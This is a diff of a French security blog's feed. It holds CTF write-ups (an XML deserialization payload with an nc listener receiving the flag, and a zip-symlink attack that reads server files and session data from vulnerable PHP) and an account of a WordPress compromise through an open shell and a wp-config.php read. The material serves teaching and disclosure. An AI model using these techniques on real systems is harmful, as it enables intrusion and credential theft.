+        &lt;span class="nt"&gt;&amp;lt;/array&amp;gt;&lt;/span&gt;                    
+        &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/java&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En essayant de créer des commandes j'ai rencontré un problème avec les redirections ('\&amp;lt;','&gt;'), c'est pourquoi ma commande pour extraire le flag est plus complexe qu'un simple reverse shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;nc -lvp 4444&lt;/span&gt;
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [195.154.70.52] from ec2...&lt;/span&gt;
+&lt;span class="go"&gt;flag{ser1l1azati0n_in_CTF_is_fUN}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Web 400 - smashthestate 400 pts&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This beautiful website for testing zip files contains a replica of a
+vulnerability found in a well known bug bounty site. Log in with
+rob:smashthestate then exploit the vulnerability to gain access to the
+'admin' account and the flag. Automated tools and bruteforcing will
+not help you solve this challenge.
+ http://54.152.101.3&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;En arrivant sur le challenge, on voit un formulaire de connexion ainsi qu'une page qui nous propose de générer un code envoyé par email à l'administrateur.&lt;/p&gt;
+&lt;p&gt;Après connexion avec l'utilisateur indiqué rob:smashthestate, on se trouve face à un formulaire d'upload qui prend une archive zip.&lt;/p&gt;
+&lt;p&gt;On envoie donc un fichier zipé au hasard et on observe que le fichier a été dezippé puis affiché.&lt;/p&gt;
+&lt;p&gt;Les archives zip sont connues pour être faillibles aux attaques par symlink, on peut donc récupérer le code source de la page :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;ln -s /var/www/html/index.php link&lt;/span&gt;
+&lt;span class="go"&gt;zip –symlinks test.zip link&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce qui donne:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$FAKE_DATABASE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;rob&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;60df0ab1a78fd0d95a4cfa4b0854931b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;// smashthestate&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;8e11a50ef762f924d7af9995889873e4&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+
+&lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;login&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;trying to log in&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="nv"&gt;$user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+        &lt;span class="nv"&gt;$pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$FAKE_DATABASE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nb"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pass&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+            &lt;span class="nb"&gt;session_regenerate_id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;True&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+            &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: ?page=upload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: ?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin_login_help&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+        &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login_code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
+            &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login_code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;openssl_random_pseudo_bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A login code has been emailed to the administrator. Once you have recieved it, please click here&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;There is already an active login code for this session&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;code_submit&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+        &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="nv"&gt;$code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login_code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$code&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login_code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
+                &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Flag: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sudo /bin/cat /var/www/html/flag&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="p"&gt;}&lt;/span&gt;
+            &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Invalid code&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+            &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Please input the login code:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;upload&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+        &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: ?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Welcome &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; Logout&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Use this form to verify zip integrity&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;process_upload&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+        &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;zipfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+
+
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;zipfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;size&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;16000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;File above max size of 10kb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;back&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+            &lt;span class="p"&gt;}&lt;/span&gt;
+            &lt;span class="nv"&gt;$tmp_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/var/www/html/tmp/upload_&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+
+            &lt;span class="c1"&gt;# ZipArchive may not be available&lt;/span&gt;
+           &lt;span class="c1"&gt;# $zip = new ZipArchive;&lt;/span&gt;
+           &lt;span class="c1"&gt;# $zip-&amp;gt;open($_FILES[&amp;#39;zipfile&amp;#39;][&amp;#39;name&amp;#39;]);&lt;/span&gt;
+           &lt;span class="c1"&gt;# $zip-&amp;gt;extractTo($tmp_file);&lt;/span&gt;
+           &lt;span class="nb"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;unzip -o &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;zipfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; -d &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$tmp_file&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Zip contents: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+            &lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cat &lt;/span&gt;&lt;span class="si"&gt;$tmp_file&lt;/span&gt;&lt;span class="s2"&gt;/* 2&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="nb"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;rm -rf &lt;/span&gt;&lt;span class="si"&gt;$tmp_file&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;back&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;form action=&amp;#39;?page=login&amp;#39; method=&amp;#39;POST&amp;#39;&amp;gt;Username: &amp;lt;input name=&amp;#39;user&amp;#39;/&amp;gt;&amp;lt;br/&amp;gt;Password: &amp;lt;input type=&amp;#39;password&amp;#39; name=&amp;#39;pass&amp;#39;/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;input type=&amp;#39;submit&amp;#39; value=&amp;#39;Log in&amp;#39;/&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a href=&amp;#39;?page=admin_login_help&amp;#39;&amp;gt;Admin login help&amp;lt;/a&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Dans la page, le flag est affiché si notre code généré correspond à la bonne valeur.&lt;/p&gt;
+&lt;p&gt;Grâce à la faille précédente on récupère notre cookie de session via les commandes :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;ln -s /var/lib/php5/sess_71kl18mrbua52acd91jceqmrs4 link&lt;/span&gt;
+&lt;span class="go"&gt;zip –-symlinks test.zip link&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Une fois le code affiché il ne reste plus qu'à le mettre dans le formulaire de validation qui nous donne le flag :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;Flag: 8e11a50ef762f924d7af9995889873e4&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon Twitter pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="WriteUp"></category><category term="CTF"></category></entry><entry><title>Comment pirater un WordPress, ou pas...</title><link href="https://test.dailysecurity.fr/comment-pirater-un-wordpress" rel="alternate"></link><published>2015-05-12T13:04:00+02:00</published><updated>2015-05-12T13:04:00+02:00</updated><author><name>Geluchat</name></author><id>tag:test.dailysecurity.fr,2015-05-12:/comment-pirater-un-wordpress</id><summary type="html">&lt;p&gt;Je ne sais pas si vous l'avez remarqué, mais il y a une semaine mon site était indisponible en raison d'une maintenance.&lt;/p&gt;
+&lt;p&gt;Tout a débuté le 1er Mai, je me rends comme chaque jour sur mon site pour les mises à jour quotidiennes et c'est alors qu'apparaît une belle deface …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Je ne sais pas si vous l'avez remarqué, mais il y a une semaine mon site était indisponible en raison d'une maintenance.&lt;/p&gt;
+&lt;p&gt;Tout a débuté le 1er Mai, je me rends comme chaque jour sur mon site pour les mises à jour quotidiennes et c'est alors qu'apparaît une belle deface (modification de la page d'accueil du site) faite par un groupe de h4x0r avec un message dans un anglais approximatif "Ure security is bad, go patch, blabla" ainsi qu'une petite mention disant que payer un hébergeur ne veut pas dire que l'on est en sécurité.&lt;/p&gt;
+&lt;p&gt;Sur le coup, j'imagine que l'un de mes plugins n'a pas été mis à jour et j'accuse le coup en me disant qu'après tout, ce n'est qu'un Wordpress.&lt;/p&gt;
+&lt;p&gt;Après une analyse un peu plus approfondie des logs j'en viens à une conclusion étrange : il semblerait qu'ils se soient tous simplement connectés avec mon compte administrateur.&lt;/p&gt;
+&lt;p&gt;Hop, je lance un scan antivirus sur mon PC, rien n'est détecté, même pas le moindre logiciel espion, pas un faux positif, rien.&lt;/p&gt;
+&lt;p&gt;J'en viens à penser que c'est peut-être une 0day mais le souvenir de la tête de mort sur la deface ainsi que les pseudos du type xXxD4rkAng3lxXx me rappellent vite que la faille ne doit pas être bien compliquée.&lt;/p&gt;
+&lt;p&gt;Je reçois plusieurs messages via IRC et Skype, un de mes amis m'a même conseillé en rigolant de lancer un armitage auto_pwn, je décide de rester plus calme en lançant un scan Nikto classique ainsi qu'une analyse des plugins Wordpress, peut être que quelque chose m'aurait échappé ...&lt;/p&gt;
+&lt;p&gt;C'est alors qu'une personne fort sympathique m'a contacté sur IRC pour me souhaiter bonne chance pour la remise en place de mon site. En discutant avec celle-ci, j'apprends que le port 31337 est ouvert sur le serveur qui m'héberge.&lt;/p&gt;
+&lt;p&gt;J'en viens alors à deux hypothèses remplies de questions :&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Ce shell vient-il de mon site?&lt;/li&gt;
+&lt;li&gt;S'il n'est pas à moi que fait-il là ? Et quels sont ses droits sur le serveur ?&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Afin de satisfaire ma curiosité je décide de m'y connecter, sachant que mon hébergeur mutualisé est lié au domaine snip.snap (ce n'est pas le domaine réel), je lance un petit :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;nc snip.snap &lt;span class="m"&gt;31337&lt;/span&gt;.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Je vérifie l'id, il correspond au compte "touspour".&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Command id Pulseheberg" src="https://www.dailysecurity.fr/images/id.png"&gt;&lt;/p&gt;
+&lt;p&gt;Et là, descente en enfer, encore une fois les mêmes questions : "Quels sont ses droits sur le serveur ? Que fait-il là ?".&lt;/p&gt;
+&lt;p&gt;Pour la deuxième question il faudra que je demande au support de mon hébergeur, je décide donc de chercher la réponse à la première question.&lt;/p&gt;
+&lt;h2&gt;Quels sont ses droits sur le serveur?&lt;/h2&gt;
+&lt;p&gt;Quelques commandes me permettent de voir que je ne suis de toute évidence pas doté de droits root, ouf.&lt;/p&gt;
+&lt;p&gt;Grâce à un affichage de /etc/passwd je vois qu'un compte est créé pour chaque nouvel utilisateur.&lt;/p&gt;
+&lt;p&gt;Niveau sécurité, ça n'a pas l'air au top niveau mais au moins je ne peux pas me déplacer dans les dossiers des autres personnes.&lt;/p&gt;
+&lt;p&gt;Enfin, ça, c'était avant le drame ...&lt;/p&gt;
+&lt;p&gt;Toujours dans le but final de découvrir comment mon site a pu être piraté par notre chère Dr34mT34m, je lance à tout hasard un listing des répertoires via le shell sur mon répertoire à priori privé :&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Listing directory dailysecurity" src="https://www.dailysecurity.fr/images/listing.png"&gt;&lt;/p&gt;
+&lt;p&gt;Et là, horreur, on ne peut pas se déplacer dans les répertoires mais on peut les lister.&lt;/p&gt;
+&lt;p&gt;Je rentre la commande :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;cat /home/dailysec/public_html/wp-config.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Des gouttes de sueurs commencent à perler sur mon front quand je vois apparaître :&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Base de données Wordpress" src="https://www.dailysecurity.fr/images/bdd.png"&gt;&lt;/p&gt;
+&lt;p&gt;A partir de ce moment, je choisis de me connecter sur le port 3306
+(MySQL) et un beau OPEN se peint devant mes yeux.&lt;/p&gt;
+&lt;p&gt;L'attaque devient alors claire:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On se connecte sur le port 31337&lt;/li&gt;
+&lt;li&gt;On récupère les logins MySQL&lt;/li&gt;
+&lt;li&gt;On se connecte et on modifie le mot de passe administrateur WordPress&lt;/li&gt;
+&lt;li&gt;On peut upload un shell dans les templates ou juste via l'upload&lt;/li&gt;
+&lt;li&gt;Enjoy your shell ...&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Que fait-il là?&lt;/h2&gt;
+&lt;p&gt;Bonne question, pour y répondre j'ai dû batailler avec le support de Pulseheberg qui m'a envoyé balader :&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Message PulseHeberg" src="https://www.dailysecurity.fr/images/message.png"&gt;&lt;/p&gt;
+&lt;p&gt;Etant une personne très patiente et dotée d'un sens du sarcasme assez poussé, je lui ai bien sûr répondu :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;"Étonnamment quand je fais un 'nc snip.snap 31337' j'obtiens un shell
+console.
+ Vos audits de sécurités sont-ils sélectifs dans le genre "on laisse
+le port 31337 ouvert, ça fait classe" ?
+ Je dis bien sûr tout ça avec le plus grand des humours mais ça me
+reste tout de même en travers de la gorge ..."&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Le tout accompagné des screenshots présents dans l'article.&lt;/p&gt;
